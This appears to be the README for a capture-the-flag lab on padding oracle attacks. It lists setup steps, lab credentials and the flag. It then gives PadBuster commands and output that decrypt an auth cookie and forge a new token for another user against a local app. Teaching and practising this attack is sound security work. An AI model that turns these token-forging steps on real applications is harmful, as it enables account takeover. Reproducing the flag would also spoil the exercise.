## Padding Oracle Attack CTF Guide
### Install requirements:
```shell
pip install -r requirements.txt
```
Then app can be run (default port 5000).

### Additional details
- Prepared user for students:
  - login: **student**
  - password: **student123**
- Account to hack:
  - login: **black13** (provided after logging)
  - password: **ry8iDHz07943** (just in case, shouldn't be brute-force prone)
- Flag value: "**The package will be delivered at 03:17 AM near the old lighthouse.**"

## PoC using PadBuster
Kali link: https://www.kali.org/tools/padbuster/

GitHub link: https://github.com/AonCyberLabs/PadBuster

I wasn't able to download from apt, so cloned from git repository and run script with perl.

### Install necessary packages
```shell
apt-get install libcrypt-ssleay-perl
```
### Decrypt token
Read token from browser cookie (x-auth) and decrypt it with PadBuster.
```shell
perl padBuster.pl http://127.0.0.1:5000/dashboard 5cdc2a88ab733064f5825afd1913c7123bacb856c502e7f76f97886c2a87017af25b157839f28c0aa6565873e038f918 16 -encoding 1 -error incorrect -cookies x-auth=5cdc2a88ab733064f5825afd1913c7123bacb856c502e7f76f97886c2a87017af25b157839f28c0aa6565873e038f918 -verbose
```
Output:
```
[+] Decrypted value (ASCII): student|2030-04-03 16:34:19
```
This is self-prepared token (5 years valid) just to make PoC work everytime.

### Encrypt token
Here I encrypt token with modified username.
```shell
perl padBuster.pl http://127.0.0.1:5000/dashboard 5cdc2a88ab733064f5825afd1913c7123bacb856c502e7f76f97886c2a87017af25b157839f28c0aa6565873e038f918 16 -encoding 1 -error incorrect -cookies x-auth=5cdc2a88ab733064f5825afd1913c7123bacb856c502e7f76f97886c2a87017af25b157839f28c0aa6565873e038f918 -verbose -plaintext 'black13|2030-04-04 16:00:00'
```
Output:
```
[+] Encrypted value is: 9d09391ea2018e9ac1a934e78aa318ac91a86daa5b0baf80bbfae781d2cedd4300000000000000000000000000000000
```
Such token can be set as browser cookie, and it completes our CTF.